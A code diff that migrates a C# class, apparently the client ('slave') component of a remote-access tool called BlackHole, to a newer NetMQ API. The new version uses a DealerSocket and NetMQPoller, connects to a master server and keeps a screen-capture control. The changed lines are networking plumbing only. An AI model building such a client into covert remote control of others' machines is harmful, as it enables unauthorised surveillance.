@@ -13,6 +13,7 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using NetMQ.Sockets;
 
 namespace BlackHole.Slave
 {
@@ -27,9 +28,8 @@ namespace BlackHole.Slave
         
         private CancellationTokenSource m_screenCaptureTokenSource;
         private Stopwatch m_receiveTimer;
-        private NetMQContext m_netContext;
         private NetMQSocket m_client;
-        private Poller m_poller;
+        private NetMQPoller m_poller;
         private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
         private string m_serverAddress;
         private bool m_connected = false;
@@ -40,14 +40,13 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
-        public MasterServer(NetMQContext context, string serverAddress)
+        public MasterServer(string serverAddress)
         {
             m_screenCaptureTokenSource = new CancellationTokenSource();
             m_screenCaptureTokenSource.Cancel();
 
             m_serverAddress = serverAddress;
-            m_netContext = context;
-            m_client = m_netContext.CreateDealerSocket();
+            m_client = new DealerSocket();
             m_client.Options.Linger = TimeSpan.Zero;
             m_client.ReceiveReady += ClientReceive;
 
@@ -56,11 +55,9 @@ namespace BlackHole.Slave
             var sendTimer = new NetMQTimer(SEND_INTERVAL);
             sendTimer.Elapsed += SendQueue;
 
-            m_poller = new Poller();
-            m_poller.PollTimeout = 10;
-            m_poller.AddTimer(sendTimer);
-            m_poller.AddSocket(m_client);
-            m_poller.PollTillCancelledNonBlocking();
+            m_poller = new NetMQPoller {sendTimer, m_client};
+            //m_poller.PollTimeout = 10;
+            m_poller.RunAsync();
             m_client.Connect(m_serverAddress);
 
             SendGreet();
